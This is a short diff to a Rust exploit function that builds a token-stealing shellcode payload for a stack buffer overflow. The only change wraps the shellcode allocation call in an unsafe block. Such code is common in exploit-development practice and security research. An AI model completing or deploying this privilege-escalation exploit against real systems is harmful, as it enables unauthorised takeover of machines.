@@ -22,7 +22,7 @@ fn exploit_stack_buffer_overflow_token_stealing() {
 
     println!("[+] Building payload...");
     let shellcode = token_stealing_shellcode();
-    let (payload, payload_len) = allocate_shellcode(shellcode.as_ptr(), shellcode.len());
+    let (payload, payload_len) = unsafe { allocate_shellcode(shellcode.as_ptr(), shellcode.len()) };
 
     let payload_address = payload as u64;
     let bytes = bytes_to_hex_string(payload, payload_len);
